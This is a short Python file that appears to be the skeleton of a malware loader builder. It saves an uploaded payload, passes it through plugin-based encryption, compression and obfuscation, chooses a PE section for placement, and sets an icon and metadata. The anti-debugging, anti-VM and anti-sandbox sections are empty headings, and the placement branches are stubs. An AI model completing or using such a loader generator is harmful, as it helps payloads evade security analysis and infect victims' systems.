import os
import json
import importlib

def generate_loader(config, icon, payload):
    # Payload
    if payload:
        payload.save(os.path.join("./uploads", "payload"))
    
    # Analysis Evasion
    ## Anti-Debugging
    ## Anti-VM
    ## Anti-Sandbox
    ## Prevent Execution

    # Encryption
    encryption = config['encryption']
    if encryption != "None":
        payload = importlib.import_module('plugins.payload_mods.encryption.' + encryption).encrypt(payload)

    # Compression
    compression = config['compression']
    if compression != "None":
        payload = importlib.import_module('plugins.payload_mods.compression.' + compression).compress(payload)

    # Obfuscation
    obfuscation = config['obfuscation']
    if obfuscation != "None":
        payload = importlib.import_module('plugins.payload_mods.obfuscation.' + obfuscation).obfuscate(payload)

    # Payload Placement
    placement = config['placement']
    if placement == "text":
        pass
    elif placement == "data":
        pass
    elif placement == "rdata":
        pass
    elif placement == "rsrc":
        pass

    # Metadata
    metadata = config['metadata']

    # Icon
    if icon:
        icon.save(os.path.join("./uploads", "icon.ico"))